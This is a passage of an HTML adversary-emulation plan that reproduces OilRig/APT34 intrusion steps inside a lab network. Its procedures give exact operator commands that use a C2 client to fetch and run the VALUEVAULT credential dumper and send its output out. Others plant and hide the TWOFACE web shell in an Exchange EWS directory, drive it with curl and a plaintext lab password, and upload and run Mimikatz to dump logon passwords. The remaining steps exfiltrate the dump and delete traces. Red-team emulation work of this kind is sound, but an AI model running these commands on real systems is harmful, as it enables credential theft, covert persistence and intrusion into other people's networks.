+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist instruction parsing: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L65-L79/">SideTwist.cpp#L65-L79</a></li>
+<li>SideTwist command execution: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L102-L114/">SideTwist.cpp#L102-L114</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist: <a href="https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/" class="outbound" target="_blank"><span>https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>VBA coding/macros: <a href="https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/" class="outbound" target="_blank"><span>https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>Helminth campaigns/enumeration: <a href="https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>EWS admin/Exchange Trusted Subsystem discovery: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-3---workstation-low-privilege-credential-dumping">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---workstation-low-privilege-credential-dumping">#</doc-anchor-trigger>
+        <span>Step 3 - Workstation Low Privilege Credential Dumping</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 3 emulates OilRig using <code v-pre>SystemFailureReporter.exe</code> to download VALUEVAULT
+(the executable for which is <code v-pre>b.exe</code>) which is then leveraged to perform a low
+privilege credential dumping. <code v-pre>SystemFailureReporter.exe</code> then uploads the
+VALUEVAULT dump (named <code v-pre>fsociety.dat</code>) back to C2 via HTTP POST request.</p>
+<p>The output of the credential dump provides a plaintext password for the current
+user <code v-pre>gosta</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> On Linux Attack Platform  as <code v-pre>saka</code>, issue the command to download VALUEVAULT
+to the workstation</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\gosta\AppData\Roaming\b.exe|b.exe'</code></pre>
+</doc-codeblock></div>
+<p>Issue the command to execute VALUEVAULT after it has been downloaded:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 C:\Users\gosta\AppData\Roaming\b.exe'</code></pre>
+</doc-codeblock></div>
+<p>Issue the command to upload output of VALUEVAULT to C2 after it has executed:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '103 C:\Users\gosta\AppData\Roaming\fsociety.dat'</code></pre>
+</doc-codeblock></div>
+<p>Confirm that the credentials were obtained on C2 server.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">ls ./files
+cat ./files/fsociety.dat</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist file download: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L129-L154">SideTwist.cpp#L129-L154</a> and <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L78-L97" class="outbound" target="_blank"><span>comms.cpp#L78-L9</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>SideTwist file upload: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L166-L178/">SideTwist.cpp#L166-L178</a>,<br />
+and <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L81">SideTwist.cpp#L81</a> -&gt; <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L113-L124" class="outbound" target="_blank"><span>comms.cpp#L113-L12</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> -&gt; <a href=".././resources/sidetwist/sidetwist/comms.cpp#L172-L294">comms.cpp#L172-L2</a></li>
+</ul>
+<br>
+<ul>
+<li>VALUEVAULT: <a href="../resources/valuevault/">VALUEVAULT</a></li>
+<li>VALUEVAULT opens Windows Vault: <a href="../resources/valuevault/vendor/vault/vault.go#L91-L97">vault.go#L91-L97</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist: <a href="https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/" class="outbound" target="_blank"><span>https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>VALUEVAULT: <a href="https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network" class="outbound" target="_blank"><span>https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>Open-source Windows Vault Password Dumper: <a href="http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt" class="outbound" target="_blank"><span>http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-4---install-web-shell-on-ews">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---install-web-shell-on-ews">#</doc-anchor-trigger>
+        <span>Step 4 - Install Web Shell on EWS</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 4 emulates OilRig installing web shell persistence on <code v-pre>WATERFALLS (10.1.0.6)</code>.
+This is accomplished by downloading the TWOFACE webshell (named <code v-pre>contact.aspx</code>)
+via <code v-pre>SystemFailureReporter.exe</code>; TWOFACE is then copied from <code v-pre>THEBLOCK</code> to
+<code v-pre>WATERFALLS</code> and hidden with <code v-pre>attrib + h</code>.</p>
+<p>OilRig covers their tracks by deleting the webshell from <code v-pre>gosta</code>&#x27;s user
+directory on <code v-pre>THEBLOCK</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>The webshell is first placed on THEBLOCK (10.1.0.5) to prepare for copying via
+SMB to WATERFALLS.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\Public\contact.aspx|contact.aspx'</code></pre>
+</doc-codeblock></div>
+<p>Once in place, OilRig has copied the webshell directly into the Exchange Web
+Services directory.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 copy C:\Users\Public\contact.aspx &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\&quot;'</code></pre>
+</doc-codeblock></div>
+<p>Set the file hidden attribute on WATERFALLS and delete the webshell from
+THEBLOCK using SideTwist</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 attrib +h &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx&quot; &amp; del C:\Users\Public\contact.aspx'</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>TwoFace Webshell: <a href="../resources/twoface/">TwoFace</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>EWS lateral movement: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-5---ews-discovery">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---ews-discovery">#</doc-anchor-trigger>
+        <span>Step 5 - EWS Discovery</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 5 emulates OilRig using the TWOFACE webshell to perform enumeration on the
+EWS <code v-pre>WATERFALLS (10.1.0.6)</code> to discover the SQL server <code v-pre>ENDOFROAD (10.1.0.7)</code>.</p>
+<p>OilRig first uses the webshell to perform some initial discovery once on the
+host by enumerating the current user, system network configuration and system
+network connections.</p>
+<p>Output of the system network connections discovery indicates an open connection
+to <code v-pre>10.1.0.7</code> via a port commonly associated with SQL.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>On Linux Attack Platform box, change directories to the TwoFace payload folder:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/payloads/TwoFace</code></pre>
+</doc-codeblock></div>
+<p>Use the webshell to enumerate the current user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has run whoami on a victim.[3][4][10]
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=whoami&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Enumerate the system network configurations.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has run ipconfig /all on a victim.[3][4]
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=ipconfig /all&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Use the webshell to perform network discovery on <code v-pre>WATERFALLS (10.1.0.6)</code>,
+discovering a connection to host 10.1.0.7 via a port commonly associated with
+SQL.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used netstat -an on a victim to get a listing of network connections.[3]
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=netstat -an&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>TwoFace Webshell instruction parsing: <a href="../resources/twoface/contact.aspx#L12-L21">contact.aspx#L12-L21</a></li>
+<li>TwoFace Webshell command execution: <a href="../resources/twoface/contact.aspx#L176-L194/">contact.aspx#L176-L194</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>TwoFace: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>Network discovery: <a href="https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-6---privileged-credential-dumping">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---privileged-credential-dumping">#</doc-anchor-trigger>
+        <span>Step 6 - Privileged Credential Dumping</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 6 emulates OilRig using the webshell to download Mimikatz to <code v-pre>WATERFALLS</code>
+and using elevated privileges to dump credentials. The dumped credentials
+(stored in <code v-pre>01.txt</code>) are exfiltrated back to the C2 (<code v-pre>192.168.0.4</code>) via the webshell.</p>
+<p>After exfiltration is complete OilRig deletes both Mimikatz and the dumped
+credentials from the directory on <code v-pre>WATERFALLS</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Download Mimikatz to <code v-pre>WATERFALLS (10.1.0.6)</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\temp\' -F &quot;vir=false&quot; -F &quot;nen=m64.exe&quot; -F 'f1=@m64.exe' https://10.1.0.6/EWS/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Dump credentials using Mimikatz. Output includes creds for SQL server
+administrator <code v-pre>tous</code>.</p>
+<p><span class="docs-emoji">&#x1F4A1;</span> <code v-pre>privilege::debug</code> has been included here to match the CTI, but is
+unnecessary due to the webshell running as SYSTEM.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1&gt; C:\Windows\Temp\01.txt&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Exfiltrate the resulting output file <code v-pre>01.txt</code> to the attacker platform.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://10.1.0.6/EWS/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Display the contents of <code v-pre>01.txt</code> in the terminal window.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cat 01.txt</code></pre>
+</doc-codeblock></div>
+<p>Clean up on <code v-pre>WATERFALLS</code> by removing the binary and output file from
+<code v-pre>C:\Windows\Temp\</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe&quot; https://10.1.0.6/EWS/contact.aspx</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2757;</span> <strong>NB</strong>: The function descriptions in TwoFace (contact.aspx) refer to the Mimikatz download as &quot;Arbitrary Folder Upload&quot; and the 01.txt exfiltration as &quot;File Download&quot; which is the reverse of how said activities are described in the emulation procedure; this is to match to CTI but results in slightly contradictory source code links.</p>
+<ul>
+<li>TwoFace Webshell download file to victim: <a href="../resources/twoface/contact.aspx#L58-L115/">contact.aspx#L58-L115</a></li>
+<li>TwoFace Webshell file upload file to C2: <a href="../resources/twoface/contact.aspx#L120-L145/">contact.aspx#L120-L145</a></li>
+<li>TwoFace Webshell temp delete: <a href="../resources/twoface/contact.aspx#L150-L169/">contact.aspx#L150-L169</a></li>
+</ul>
+<br>
+<ul>
+<li>Mimikatz: <a href="../resources/mimikatz/">Mimikatz</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
